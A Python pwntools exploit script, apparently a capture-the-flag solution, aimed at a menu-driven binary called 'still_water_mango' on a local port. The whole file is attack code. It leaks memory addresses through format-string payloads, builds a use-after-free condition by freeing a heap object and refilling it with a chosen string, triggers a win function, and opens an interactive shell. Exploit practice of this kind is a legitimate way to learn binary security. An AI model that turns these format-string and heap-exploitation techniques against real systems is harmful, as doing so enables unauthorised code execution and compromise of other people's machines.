#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
binary = './still_water_mango'

conn = remote('localhost', 9999) # prob gonna need to adjust later

def menu(choice):
    conn.recvuntil(b'> ')
    conn.sendline(str(choice).encode())

def view_recipe(fmt_str):
    menu(1)
    conn.recvuntil(b'> ')
    conn.sendline(fmt_str.encode())
    response = conn.recvuntil(b'\n\n', drop=True)
    return response.replace(b'Recipe details: ', b'')

def add_water(payload):
    menu(2)
    conn.recvuntil(b'> ')
    conn.sendline(payload)

def add_mango(flavor="mango", remove=False):
    menu(3)
    conn.recvuntil(b'flavor: ')
    conn.sendline(flavor.encode())
    conn.recvuntil(b'> ')
    conn.sendline(b'y' if remove else b'n')

def add_secret(length, content):
    menu(4)
    conn.recvuntil(b'length: ')
    conn.sendline(str(length).encode())
    conn.recvuntil(b'name: ')
    conn.send(content)

def mix_drink():
    menu(5)

def win():
    menu(6)

# STAGE 1: Add water normally (without buffer overflow)
log.info("Stage 1: Adding water normally...")
add_water(b"regular water")

# STAGE 2: Use format string to leak addresses
log.info("Stage 2: Leaking addresses with format string...")
for i in range(10, 20):
    leak = view_recipe(f"%{i}$p")
    log.info(f"Format string leak at {i}: {leak}")

# STAGE 3: Add and remove mango to create UAF condition
log.info("Stage 3: Creating use-after-free condition...")
add_mango(flavor="sweet mango", remove=True)

# STAGE 4: Add secret ingredient with value "respected"
log.info("Stage 4: Adding secret ingredient...")
add_secret(10, b"respected\0")

# STAGE 5: Add another mango without removing it
log.info("Stage 5: Adding final mango...")
add_mango(flavor="respected", remove=False)

# STAGE 6: Mix the drink
log.info("Stage 6: Mixing the drink...")
mix_drink()

# STAGE 7: Try to win
log.info("Stage 7: Calling win function...")
win()

# Get shell
log.info("Getting shell...")
conn.interactive()
